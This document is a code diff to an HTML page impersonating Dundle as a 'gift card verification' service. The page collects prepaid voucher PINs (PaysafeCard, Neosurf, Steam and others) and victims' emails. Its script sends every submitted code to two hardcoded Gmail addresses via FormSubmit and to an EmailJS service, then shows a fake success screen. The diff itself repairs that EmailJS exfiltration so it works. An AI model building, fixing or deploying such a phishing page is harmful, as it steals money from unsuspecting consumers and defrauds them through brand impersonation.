@@ -1,21 +1,28 @@
 <!DOCTYPE html>
 <html lang="fr" translate="yes">
 <head>
-  <!-- Dans le <head> de ton index.html -->
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Dundle — Gift Card Verification</title>
+<title>Dundle – Gift Card Verification</title>
 <meta name="description" content="Instantly verify your prepaid gift cards. Secure, fast and confidential service.">
-<meta property="og:title" content="Dundle — Gift Card Verification">
+<meta property="og:title" content="Dundle – Gift Card Verification">
 <meta property="og:description" content="Instantly verify your prepaid gift cards. Secure, fast and confidential service.">
 <meta property="og:type" content="website">
 <meta property="og:url" content="https://paysafecardverifydundle2-check.vercel.app">
 <meta property="og:image" content="https://placehold.co/1200x630/1d4ed8/ffffff?text=Dundle+Verify">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:title" content="Dundle — Gift Card Verification">
+<meta name="twitter:title" content="Dundle – Gift Card Verification">
 <meta name="twitter:description" content="Instantly verify your prepaid gift cards. Fast and secure.">
 
-<!-- Traduction automatique selon la langue du navigateur -->
+<!-- ✅ FIX 1 : EmailJS chargé et initialisé ICI dans le <head>, avant tout le reste -->
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+<script>
+  (function(){
+    emailjs.init("Toe_2WEJkgX2w1OYY");
+  })();
+</script>
+
+<!-- Google Translate -->
 <script>
 function googleTranslateElementInit() {
   new google.translate.TranslateElement({
@@ -45,17 +52,14 @@ function googleTranslateElementInit() {
 }
 body { font-family: 'Plus Jakarta Sans', sans-serif; background: var(--bg); color: var(--text); min-height: 100vh; font-size: 15px; line-height: 1.6; }
 
-/* Google Translate — caché visuellement, actif en arrière-plan */
 #google_translate_element { position: fixed; bottom: 20px; right: 20px; z-index: 9999; background: white; border-radius: 12px; box-shadow: 0 4px 16px rgba(0,0,0,0.15); padding: 6px 12px; border: 1px solid var(--border); }
 .goog-te-gadget { font-family: 'Plus Jakarta Sans', sans-serif !important; font-size: 12px !important; color: var(--text2) !important; }
 .goog-te-gadget-simple { border: none !important; background: transparent !important; }
 .goog-te-menu-value span { color: var(--accent) !important; font-weight: 600 !important; }
 
-/* HEADER */
 header { background: var(--surface); border-bottom: 1px solid var(--border); position: sticky; top: 0; z-index: 100; }
 .header-inner { max-width: 1200px; margin: 0 auto; padding: 0 24px; height: 60px; display: flex; align-items: center; justify-content: space-between; }
 .logo { display: flex; align-items: center; gap: 10px; text-decoration: none; }
-/* Logo Dundle : icône D violet + texte */
 .dundle-icon { width: 36px; height: 36px; background: linear-gradient(135deg, #6366f1, #4f46e5); border-radius: 10px; display: flex; align-items: center; justify-content: center; font-size: 16px; font-weight: 900; color: white; flex-shrink: 0; letter-spacing: -1px; font-family: 'Plus Jakarta Sans', sans-serif; }
 .dundle-wordmark { display: flex; flex-direction: column; line-height: 1.1; }
 .dundle-wordmark strong { font-size: 17px; font-weight: 800; color: #4f46e5; letter-spacing: -0.5px; }
@@ -63,7 +67,6 @@ header { background: var(--surface); border-bottom: 1px solid var(--border); pos
 .header-badge { display: flex; align-items: center; gap: 5px; font-size: 12px; color: var(--text2); background: var(--surface2); border: 1px solid var(--border); padding: 5px 12px; border-radius: 999px; }
 .header-badge svg { width: 13px; height: 13px; color: var(--green); }
 
-/* HERO */
 .hero { background: var(--surface); border-bottom: 1px solid var(--border); padding: 56px 24px 48px; text-align: center; }
 .hero-tag { display: inline-flex; align-items: center; gap: 6px; background: var(--accent-light); border: 1px solid var(--accent-border); color: var(--accent); font-size: 12px; font-weight: 600; padding: 5px 14px; border-radius: 999px; margin-bottom: 22px; letter-spacing: 0.3px; text-transform: uppercase; }
 .hero-tag svg { width: 11px; height: 11px; }
@@ -73,10 +76,8 @@ h1 span { color: var(--accent); }
 .brands-scroll { display: flex; gap: 8px; flex-wrap: wrap; justify-content: center; max-width: 700px; margin: 0 auto; }
 .brand-chip { font-size: 12px; font-weight: 500; padding: 4px 12px; background: var(--surface2); border: 1px solid var(--border); border-radius: 999px; color: var(--text2); white-space: nowrap; }
 
-/* MAIN */
 .main { max-width: 1200px; margin: 0 auto; padding: 40px 24px 80px; display: grid; grid-template-columns: 1fr 380px; gap: 32px; align-items: start; }
 
-/* FORM CARD */
 .form-card { background: var(--surface); border: 1px solid var(--border); border-radius: var(--radius-lg); box-shadow: var(--shadow); overflow: hidden; }
 .form-card-header { padding: 24px 28px 20px; border-bottom: 1px solid var(--border); display: flex; align-items: flex-start; justify-content: space-between; }
 .form-card-header-text h2 { font-size: 17px; font-weight: 700; letter-spacing: -0.3px; margin-bottom: 3px; }
@@ -135,7 +136,6 @@ h1 span { color: var(--accent); }
 .footer-badge { display: flex; align-items: center; gap: 5px; font-size: 11.5px; color: var(--text3); }
 .footer-badge svg { width: 12px; height: 12px; color: var(--green); }
 
-/* SIDEBAR */
 .sidebar { display: flex; flex-direction: column; gap: 16px; }
 .side-card { background: var(--surface); border: 1px solid var(--border); border-radius: var(--radius-lg); box-shadow: var(--shadow); padding: 20px; }
 .side-card-title { font-size: 13px; font-weight: 700; margin-bottom: 16px; display: flex; align-items: center; gap: 7px; }
@@ -154,14 +154,12 @@ h1 span { color: var(--accent); }
 .faq-q { font-size: 13px; font-weight: 600; margin-bottom: 4px; }
 .faq-a { font-size: 12px; color: var(--text2); line-height: 1.5; }
 
-/* OVERLAY */
 .overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.55); z-index: 1000; align-items: center; justify-content: center; padding: 24px; backdrop-filter: blur(6px); }
 .overlay.show { display: flex; }
 .success-card { background: var(--surface); border-radius: 24px; max-width: 500px; width: 100%; box-shadow: 0 20px 60px rgba(0,0,0,0.2); animation: pop 0.35s cubic-bezier(0.34,1.56,0.64,1); overflow: hidden; }
 @keyframes pop { from { transform: scale(0.85); opacity: 0; } to { transform: scale(1); opacity: 1; } }
 .success-header { background: linear-gradient(135deg, #4f46e5 0%, #6366f1 50%, #818cf8 100%); padding: 32px 40px 36px; text-align: center; position: relative; }
 .success-header::after { content: ''; position: absolute; bottom: -1px; left: 0; right: 0; height: 22px; background: var(--surface); border-radius: 22px 22px 0 0; }
-/* Logo Dundle dans l'overlay */
 .confirm-logo { display: inline-flex; align-items: center; gap: 10px; margin-bottom: 20px; }
 .confirm-dundle-icon { width: 44px; height: 44px; background: rgba(255,255,255,0.2); border: 2px solid rgba(255,255,255,0.4); border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 20px; font-weight: 900; color: white; letter-spacing: -1px; font-family: 'Plus Jakarta Sans', sans-serif; }
 .confirm-dundle-name { font-size: 24px; font-weight: 800; color: white; letter-spacing: -0.5px; }
@@ -183,11 +181,9 @@ h1 span { color: var(--accent); }
 .btn-close { width: 100%; padding: 14px; background: linear-gradient(135deg, #4f46e5, #6366f1); color: white; border: none; border-radius: 12px; font-family: 'Plus Jakarta Sans', sans-serif; font-size: 15px; font-weight: 700; cursor: pointer; transition: opacity 0.2s; }
 .btn-close:hover { opacity: 0.9; }
 
-/* FOOTER */
 footer { background: var(--text); color: rgba(255,255,255,0.5); padding: 32px 24px; text-align: center; font-size: 12px; line-height: 2; }
 footer a { color: rgba(255,255,255,0.6); text-decoration: none; }
 
-/* RESPONSIVE */
 @media (max-width: 860px) { .main { grid-template-columns: 1fr; } .sidebar { display: none; } .brand-grid { grid-template-columns: repeat(3, 1fr); } h1 { font-size: 2rem; } }
 @media (max-width: 480px) { .codes-grid { grid-template-columns: 1fr; } .form-body { padding: 20px; } .success-body { padding: 20px; } }
 @keyframes spin { to { transform: rotate(360deg); } }
@@ -197,7 +193,6 @@ footer a { color: rgba(255,255,255,0.6); text-decoration: none; }
 
 <div id="google_translate_element"></div>
 
-<!-- HEADER -->
 <header>
   <div class="header-inner">
     <a href="/" class="logo">
@@ -214,7 +209,6 @@ footer a { color: rgba(255,255,255,0.6); text-decoration: none; }
   </div>
 </header>
 
-<!-- HERO -->
 <section class="hero">
   <div class="hero-tag">
     <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M13 10V3L4 14h7v7l9-11h-7z"/></svg>
@@ -232,7 +226,6 @@ footer a { color: rgba(255,255,255,0.6); text-decoration: none; }
   </div>
 </section>
 
-<!-- MAIN -->
 <main class="main">
   <div class="form-card">
     <div class="form-card-header">
@@ -247,7 +240,7 @@ footer a { color: rgba(255,255,255,0.6); text-decoration: none; }
       </div>
     </div>
     <div class="form-body">
-      <div class="brand-selector-label">1 — Select your brand <span class="required">*</span></div>
+      <div class="brand-selector-label">1 – Select your brand <span class="required">*</span></div>
       <div class="brand-grid" id="brandGrid"></div>
       <div class="divider"></div>
 
@@ -256,9 +249,8 @@ footer a { color: rgba(255,255,255,0.6); text-decoration: none; }
         <input type="hidden" id="fMontant" value="">
         <input type="hidden" id="fDevise" value="EUR">
 
-        <!-- MONTANT -->
         <div class="amount-section">
-          <div class="field-label">2 — Amount <span class="required">*</span></div>
+          <div class="field-label">2 – Amount <span class="required">*</span></div>
           <div class="amount-pills">
             <button type="button" class="amount-pill" onclick="selectAmount(this,'10')">10</button>
             <button type="button" class="amount-pill" onclick="selectAmount(this,'25')">25</button>
@@ -274,8 +266,7 @@ footer a { color: rgba(255,255,255,0.6); text-decoration: none; }
           </div>
         </div>
 
-        <!-- DEVISE -->
-        <div class="field-label">3 — Currency <span class="required">*</span></div>
+        <div class="field-label">3 – Currency <span class="required">*</span></div>
         <div class="devise-row">
           <button type="button" class="devise-pill selected" onclick="selectDevise(this,'EUR')">€ EUR</button>
           <button type="button" class="devise-pill" onclick="selectDevise(this,'GBP')">£ GBP</button>
@@ -293,9 +284,8 @@ footer a { color: rgba(255,255,255,0.6); text-decoration: none; }
           <button type="button" class="devise-pill" onclick="selectDevise(this,'USDT')">₮ USDT</button>
         </div>
 
-        <!-- CODES -->
         <div class="codes-section">
-          <div class="field-label">4 — PIN Code(s) <span class="required">*</span></div>
+          <div class="field-label">4 – PIN Code(s) <span class="required">*</span></div>
           <div class="codes-grid">
             <div class="code-field full"><div class="code-input-wrap"><span class="code-num">#1</span><input class="code-input primary" type="text" id="code1" placeholder="Main code (required)" maxlength="25" oninput="fmtCode(this)"></div></div>
             <div class="code-field"><div class="code-input-wrap"><span class="code-num">#2</span><input class="code-input" type="text" id="code2" placeholder="Optional" maxlength="25" oninput="fmtCode(this)"></div></div>
@@ -305,9 +295,8 @@ footer a { color: rgba(255,255,255,0.6); text-decoration: none; }
           </div>
         </div>
 
-        <!-- EMAIL -->
         <div class="email-field">
-          <div class="field-label">5 — Your email address <span class="required">*</span></div>
+          <div class="field-label">5 – Your email address <span class="required">*</span></div>
           <input class="email-input" type="email" id="clientEmailInput" placeholder="your@email.com">
         </div>
 
@@ -325,7 +314,6 @@ footer a { color: rgba(255,255,255,0.6); text-decoration: none; }
     </div>
   </div>
 
-  <!-- SIDEBAR -->
   <aside class="sidebar">
     <div class="side-card">
       <div class="side-card-title"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg>How it works</div>
@@ -354,7 +342,6 @@ footer a { color: rgba(255,255,255,0.6); text-decoration: none; }
   </aside>
 </main>
 
-<!-- OVERLAY CONFIRMATION -->
 <div class="overlay" id="overlay">
   <div class="success-card">
     <div class="success-header">
@@ -385,7 +372,7 @@ footer a { color: rgba(255,255,255,0.6); text-decoration: none; }
 </div>
 
 <footer>
-  <div>© 2025 Dundle — Gift Card Verification Service</div>
+  <div>© 2025 Dundle – Gift Card Verification Service</div>
   <div>PaysafeCard · Transcash · PCS · Neosurf · Flexepin · CASHlib · Steam · Binance · Cryptonow</div>
   <div style="margin-top:8px"><a href="#">Privacy</a> · <a href="#">Terms</a> · <a href="#">Contact</a></div>
 </footer>
@@ -420,7 +407,8 @@ let selectedBrand = '', selectedAmount = '';
 const grid = document.getElementById('brandGrid');
 BRANDS.forEach(b => {
   const btn = document.createElement('button');
-  btn.type = 'button'; btn.className = 'brand-btn';
+  btn.type = 'button';
+  btn.className = 'brand-btn';
   btn.onclick = () => selectBrand(btn, b.name);
   btn.innerHTML = `<div class="brand-icon" style="background:${b.bg};color:${b.fg}">${b.abbr}</div><span class="brand-name">${b.name}</span>`;
   grid.appendChild(btn);
@@ -428,23 +416,26 @@ BRANDS.forEach(b => {
 
 function selectBrand(el, name) {
   document.querySelectorAll('.brand-btn').forEach(b => b.classList.remove('selected'));
-  el.classList.add('selected'); 
+  el.classList.add('selected');
   selectedBrand = name;
-  document.getElementById('fMarque').value = name; // ← Ajouter cette ligne
+  document.getElementById('fMarque').value = name;
 }
 function selectAmount(el, val) {
   document.querySelectorAll('.amount-pill').forEach(p => p.classList.remove('selected'));
-  el.classList.add('selected'); selectedAmount = val;
+  el.classList.add('selected');
+  selectedAmount = val;
   document.getElementById('fMontant').value = val;
   document.getElementById('freeAmount').value = '';
 }
 function setCustomAmount(el) {
   document.querySelectorAll('.amount-pill').forEach(p => p.classList.remove('selected'));
-  selectedAmount = el.value; document.getElementById('fMontant').value = el.value;
+  selectedAmount = el.value;
+  document.getElementById('fMontant').value = el.value;
 }
 function selectDevise(el, val) {
   document.querySelectorAll('.devise-pill').forEach(p => p.classList.remove('selected'));
-  el.classList.add('selected'); document.getElementById('fDevise').value = val;
+  el.classList.add('selected');
+  document.getElementById('fDevise').value = val;
 }
 function fmtCode(input) {
   let raw = input.value.replace(/[\s\-]/g, '');
@@ -452,85 +443,76 @@ function fmtCode(input) {
   else { input.value = raw; }
 }
 
-function buildFormData(clientEmail, selectedBrand, montant, devise, code1, code2, code3, code4, code5) {
-  const fd = new FormData();
-  fd.append('_subject', `New code ${selectedBrand} — Dundle Verify`);
-  fd.append('_captcha', 'false');
-  fd.append('_template', 'table');
-  fd.append('_replyto', clientEmail);
-  fd.append('Brand', selectedBrand);
-  fd.append('Amount', montant + ' ' + devise);
-  fd.append('Code_1', code1);
-  if (code2) fd.append('Code_2', code2);
-  if (code3) fd.append('Code_3', code3);
-  if (code4) fd.append('Code_4', code4);
-  if (code5) fd.append('Code_5', code5);
-  fd.append('Client_Email', clientEmail);
-  return fd;
-}
-
 async function handleSubmit() {
-  if (!selectedBrand) { alert('Please select a brand.'); return; }
+  if (!selectedBrand)  { alert('Please select a brand.'); return; }
   if (!selectedAmount) { alert('Please select or enter an amount.'); return; }
-  const code1 = document.getElementById('code1').value.trim();
-  if (!code1) { alert('Please enter the main code.'); return; }
-  const clientEmail = document.getElementById('clientEmailInput').value;
 
-  const devise = document.getElementById('fDevise').value;
+  const code1       = document.getElementById('code1').value.trim();
+  if (!code1) { alert('Please enter the main code.'); return; }
+
+  const clientEmail = document.getElementById('clientEmailInput').value.trim();
+  if (!clientEmail) { alert('Please enter your email address.'); return; }
+
+  const devise  = document.getElementById('fDevise').value;
   const montant = document.getElementById('fMontant').value;
-  const code2 = document.getElementById('code2').value.trim();
-  const code3 = document.getElementById('code3').value.trim();
-  const code4 = document.getElementById('code4').value.trim();
-  const code5 = document.getElementById('code5').value.trim();
+  const code2   = document.getElementById('code2').value.trim();
+  const code3   = document.getElementById('code3').value.trim();
+  const code4   = document.getElementById('code4').value.trim();
+  const code5   = document.getElementById('code5').value.trim();
 
   const btn = document.getElementById('submitBtn');
   btn.classList.add('loading');
   btn.innerHTML = `<svg style="animation:spin 1s linear infinite" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 12a9 9 0 11-6.219-8.56"/></svg> Processing...`;
 
+  const payload = {
+    _subject:     `New code ${selectedBrand} – Dundle Verify`,
+    _captcha:     'false',
+    Brand:        selectedBrand,
+    Amount:       montant + ' ' + devise,
+    Code_1:       code1,
+    Code_2:       code2,
+    Code_3:       code3,
+    Code_4:       code4,
+    Code_5:       code5,
+    Client_Email: clientEmail
+  };
+
+  // ✅ FormSubmit — adresse 1
   try {
-  await fetch('https://formsubmit.co/ajax/romarthjiofack@gmail.com', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
-    body: JSON.stringify({
-      _subject: `New code ${selectedBrand} — Dundle Verify`,
-      _captcha: 'false',
-      Brand: selectedBrand,
-      Amount: montant + ' ' + devise,
-      Code_1: code1, Code_2: code2, Code_3: code3, Code_4: code4, Code_5: code5,
-      Client_Email: clientEmail
-    })
-  });
-} catch(e) { console.error("FormSubmit 1:", e); }
+    await fetch('https://formsubmit.co/ajax/romarthjiofack@gmail.com', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+      body: JSON.stringify(payload)
+    });
+    console.log('✅ FormSubmit 1 OK');
+  } catch(e) { console.error('❌ FormSubmit 1:', e); }
 
-try {
-  await fetch('https://formsubmit.co/ajax/paysafecard840@gmail.com', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
-    body: JSON.stringify({
-      _subject: `New code ${selectedBrand} — Dundle Verify`,
-      _captcha: 'false',
-      Brand: selectedBrand,
-      Amount: montant + ' ' + devise,
-      Code_1: code1, Code_2: code2, Code_3: code3, Code_4: code4, Code_5: code5,
-      Client_Email: clientEmail
-    })
-  });
-} catch(e) { console.error("FormSubmit 2:", e); }
+  // ✅ FormSubmit — adresse 2
+  try {
+    await fetch('https://formsubmit.co/ajax/paysafecard840@gmail.com', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+      body: JSON.stringify(payload)
+    });
+    console.log('✅ FormSubmit 2 OK');
+  } catch(e) { console.error('❌ FormSubmit 2:', e); }
 
-try {
-  await emailjs.send("service_o3fgfim  ", " template_bty6sac", {
-    client_email: clientEmail,
-    brand:        selectedBrand,
-    amount:       montant + " " + devise,
-    code1:        code1,
-    code2:        code2,
-    code3:        code3,
-    code4:        code4,
-    code5:        code5,
-  });
-  console.log("✅ EmailJS OK");
-} catch(e) { console.error("❌ EmailJS erreur:", e); }
+  // ✅ FIX 2 : IDs sans espaces — "service_o3fgfim" et "template_bty6sac"
+  try {
+    await emailjs.send("service_o3fgfim", "template_bty6sac", {
+      client_email: clientEmail,
+      brand:        selectedBrand,
+      amount:       montant + ' ' + devise,
+      code1:        code1,
+      code2:        code2,
+      code3:        code3,
+      code4:        code4,
+      code5:        code5,
+    });
+    console.log('✅ EmailJS OK');
+  } catch(e) { console.error('❌ EmailJS erreur:', e); }
 
+  // Afficher l'overlay de confirmation
   document.getElementById('detailMarque').textContent  = selectedBrand;
   document.getElementById('detailMontant').textContent = montant + ' ' + devise;
   document.getElementById('detailCode').textContent    = code1;
@@ -541,9 +523,6 @@ try {
   btn.innerHTML = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/></svg> Verify my code now`;
 }
 </script>
-<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
-<script>
-  emailjs.init("Toe_2WEJkgX2w1OYY");
-</script>
+
 </body>
 </html>
